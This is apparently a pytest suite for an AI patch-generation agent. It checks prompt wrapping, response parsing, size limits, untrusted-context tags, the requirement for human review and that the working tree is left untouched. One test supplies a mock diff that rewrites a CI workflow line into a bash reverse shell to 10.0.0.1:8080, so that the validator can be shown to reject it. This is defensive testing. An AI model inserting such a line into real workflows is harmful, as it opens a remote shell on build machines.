"""Unit tests for patch generation engine in agent.patcher."""
import json
from unittest.mock import MagicMock
import pytest
from agent.patcher import (
    PatchGenerator,
    generate_patch,
    build_patch_prompt,
    parse_patch_response,
)
from agent.models import (
    AnalysisResult,
    FixSuggestion,
    AgentConfig,
    PatchStatus,
    PatchProposal,
)
from agent.providers import GeminiProvider


SAMPLE_DIAGNOSIS = AnalysisResult(
    severity="high",
    failure_types=["test"],
    root_cause="AssertionError in test_health_endpoint: expected status 200, got 500",
    fixes=[
        FixSuggestion(
            type="test",
            title="Update health route",
            description="Ensure /health returns 200 OK",
            code="return {'status': 'ok'}, 200",
        )
    ],
    prevention="Run pytest before pushing commits",
    confidence="high",
    log_evidence="FAILED sample-app/tests/test_app.py::test_health_endpoint",
)

MOCK_VALID_DIFF = """--- a/sample-app/app.py
+++ b/sample-app/app.py
@@ -10,3 +10,3 @@
 def health():
-    return {"status": "error"}, 500
+    return {"status": "ok"}, 200
"""


def test_build_patch_prompt_wraps_in_untrusted_tags():
    """Verify failure logs and suggestions are safely wrapped in <untrusted_failure_context> tags."""
    prompt = build_patch_prompt(SAMPLE_DIAGNOSIS, source_snippets="def health(): return 500")
    assert "<untrusted_failure_context>" in prompt
    assert "</untrusted_failure_context>" in prompt
    assert "AssertionError in test_health_endpoint" in prompt
    assert "def health(): return 500" in prompt


def test_parse_patch_response_clean_json():
    """Verify parsing clean JSON response into explanation and diff."""
    raw = json.dumps({
        "explanation": "Fix return status in health endpoint",
        "diff": MOCK_VALID_DIFF,
    })
    expl, diff = parse_patch_response(raw)
    assert expl == "Fix return status in health endpoint"
    assert "--- a/sample-app/app.py" in diff


def test_parse_patch_response_markdown_blocks():
    """Verify parsing markdown-fenced JSON containing markdown-fenced diff."""
    inner_payload = json.dumps({
        "explanation": "Fix route logic",
        "diff": f"```diff\n{MOCK_VALID_DIFF}\n```",
    })
    raw = f"```json\n{inner_payload}\n```"
    expl, diff = parse_patch_response(raw)
    assert expl == "Fix route logic"
    assert "--- a/sample-app/app.py" in diff
    assert "```" not in diff


def test_parse_patch_response_missing_diff():
    """Verify ValueError is raised when diff field is missing or empty."""
    bad_json = json.dumps({"explanation": "No diff here", "diff": ""})
    with pytest.raises(ValueError, match="empty 'diff'"):
        parse_patch_response(bad_json)


def test_generate_patch_gemini_success():
    """Verify complete patch generation flow using mocked Gemini provider."""
    mock_provider = MagicMock(spec=GeminiProvider)
    mock_response = json.dumps({
        "explanation": "Correct health route status to 200",
        "diff": MOCK_VALID_DIFF,
    })
    mock_provider.generate_text.return_value = mock_response

    cfg = AgentConfig(ai_provider="gemini", gemini_api_key="test-key")
    generator = PatchGenerator(provider=mock_provider, config=cfg)
    proposal = generator.generate(SAMPLE_DIAGNOSIS)

    assert isinstance(proposal, PatchProposal)
    assert proposal.status == PatchStatus.VALIDATED
    assert proposal.explanation == "Correct health route status to 200"
    assert len(proposal.files) == 1
    assert proposal.files[0].path == "sample-app/app.py"
    assert proposal.validation is not None
    assert proposal.validation.is_valid
    assert proposal.requires_human_review is True
    # Truthfulness guarantee: never claim verified before Phase 05
    assert proposal.is_verified is False
    assert "UNVERIFIED" in proposal.verification_claim_disclaimer


def test_generate_patch_truthfulness_enforced():
    """Verify truthfulness policy: patch proposals are marked UNVERIFIED with disclaimer."""
    mock_provider = MagicMock(spec=GeminiProvider)
    mock_provider.generate_text.return_value = json.dumps({
        "explanation": "Fix bug",
        "diff": MOCK_VALID_DIFF,
    })
    proposal = generate_patch(SAMPLE_DIAGNOSIS, provider=mock_provider)
    assert proposal.is_verified is False
    assert "Phase 05" in proposal.verification_claim_disclaimer
    assert "Passing tests or bug-free fixes are not claimed or guaranteed" in proposal.verification_claim_disclaimer


def test_generate_patch_model_returns_malicious_path_rejected():
    """Verify that an AI-generated patch targeting .github/ is strictly rejected by the validator."""
    malicious_diff = """--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1,2 +1,2 @@
-run: pytest
+run: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
"""
    mock_provider = MagicMock()
    mock_provider.generate_text.return_value = json.dumps({
        "explanation": "Attempt to alter CI workflow",
        "diff": malicious_diff,
    })

    proposal = generate_patch(SAMPLE_DIAGNOSIS, provider=mock_provider)
    assert proposal.status == PatchStatus.REJECTED
    assert proposal.validation is not None
    assert not proposal.validation.is_valid
    assert any(e.code == "PROHIBITED_FILE_MODIFICATION" for e in proposal.validation.errors)


def test_generate_patch_model_returns_oversized_diff_rejected():
    """Verify that an oversized diff generated by the model is rejected."""
    adds = "\n".join([f"+x = {i}" for i in range(160)])
    oversized_diff = f"""--- a/sample-app/app.py
+++ b/sample-app/app.py
@@ -1,1 +1,161 @@
-x = 0
{adds}
"""
    mock_provider = MagicMock()
    mock_provider.generate_text.return_value = json.dumps({
        "explanation": "Oversized refactor",
        "diff": oversized_diff,
    })

    cfg = AgentConfig(ai_provider="gemini", gemini_api_key="test-key", max_patch_lines=150)
    proposal = generate_patch(SAMPLE_DIAGNOSIS, config=cfg, provider=mock_provider)
    assert proposal.status == PatchStatus.REJECTED
    assert any(e.code == "EXCESSIVE_LINES_MODIFIED" for e in proposal.validation.errors)


def test_generate_patch_model_returns_malformed_json():
    """Verify that malformed model text results in FAILED status without crashing."""
    mock_provider = MagicMock()
    mock_provider.generate_text.return_value = "Sorry, I cannot generate a patch for this failure."

    proposal = generate_patch(SAMPLE_DIAGNOSIS, provider=mock_provider)
    assert proposal.status == PatchStatus.FAILED
    assert proposal.validation is not None
    assert not proposal.validation.is_valid
    assert any(e.code == "GENERATION_FAILED" for e in proposal.validation.errors)


def test_generate_patch_provider_error():
    """Verify provider runtime errors result in FAILED proposal without crashing."""
    mock_provider = MagicMock()
    mock_provider.generate_text.side_effect = RuntimeError("Rate limit exhausted")

    proposal = generate_patch(SAMPLE_DIAGNOSIS, provider=mock_provider)
    assert proposal.status == PatchStatus.FAILED
    assert any(e.code == "GENERATION_FAILED" for e in proposal.validation.errors)


def test_generate_patch_working_tree_is_untouched(tmp_path):
    """Verify generating and validating a patch leaves the actual filesystem completely untouched."""
    app_dir = tmp_path / "sample-app"
    app_dir.mkdir()
    target_file = app_dir / "app.py"
    original_code = 'def health():\n    return {"status": "error"}, 500\n'
    target_file.write_text(original_code, encoding="utf-8")

    mock_provider = MagicMock()
    mock_provider.generate_text.return_value = json.dumps({
        "explanation": "Fix health route",
        "diff": MOCK_VALID_DIFF,
    })

    proposal = generate_patch(
        SAMPLE_DIAGNOSIS,
        provider=mock_provider,
        repo_root=str(tmp_path),
    )
    assert proposal.status == PatchStatus.VALIDATED

    # Assert working tree file was NEVER written or modified
    current_code = target_file.read_text(encoding="utf-8")
    assert current_code == original_code


def test_patch_proposal_model_serialization():
    """Verify PatchProposal serializes cleanly to JSON and supports subscript/get access."""
    mock_provider = MagicMock()
    mock_provider.generate_text.return_value = json.dumps({
        "explanation": "Fix route",
        "diff": MOCK_VALID_DIFF,
    })
    proposal = generate_patch(SAMPLE_DIAGNOSIS, provider=mock_provider)

    data = proposal.model_dump()
    assert data["status"] == "validated"
    assert data["is_verified"] is False
    assert len(data["files"]) == 1

    # Test dictionary-like access
    assert proposal["status"] == PatchStatus.VALIDATED
    assert proposal.get("status") == PatchStatus.VALIDATED
    assert proposal.get("nonexistent", "default") == "default"
